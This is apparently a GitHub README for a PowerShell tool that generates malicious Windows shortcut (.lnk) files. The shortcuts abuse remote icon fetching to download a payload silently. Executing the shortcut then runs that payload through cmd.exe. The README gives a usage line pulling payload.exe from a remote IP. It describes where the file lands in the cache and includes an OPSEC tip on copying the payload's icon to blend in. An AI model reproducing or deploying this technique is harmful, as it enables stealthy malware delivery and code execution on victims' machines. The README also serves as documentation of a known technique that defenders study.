# Malicious-LnkGenerator
Download (and execute) payloads using Windows shortcuts (.lnk) files. Lnk files can download remote icons (`.ico` files). This mechanism can be abused to trick Windows into downloading arbitrary files. 
Executing the shortcut will then execute the downloaded payload.

## Usage
```
.\LnkGen.ps1 <outfile> <uri>
.\LnkGen.ps1 C:\Users\User\Desktop\Shortcut.lnk http://192.168.1.2/payload.exe
```

## Some notes
The file will be downloaded without executing the `.lnk` itself. This will also be the case when unzipping the `.lnk`. 
The file will be saved as `filename[1].extension` and stored in the following location (tested on Windows 10):
```
%USERPROFILE%\AppData\Local\Microsoft\Windows\INetCache\IE\<randomfolder>\<filename[1].extension>
```
It uses `C:\Windows\System32\cmd.exe` to execute the payload using additional arguments to search through the random folders looking for our payload.


This is a simple proof of concept and does not account for rapid use or using it in production environments. 


> OPSEC: The shortcut will clone the `icon` of the payload once it is downloaded. You can use this to your advantage when blending into an environment.

## Credits 
This script is based on the work of [Jan Kopriva](https://untrustednetwork.net/en/) which can be read in the following [blog](https://isc.sans.edu/diary/Using+Shell+Links+as+zerotouch+downloaders+and+to+initiate+network+connections/26276)

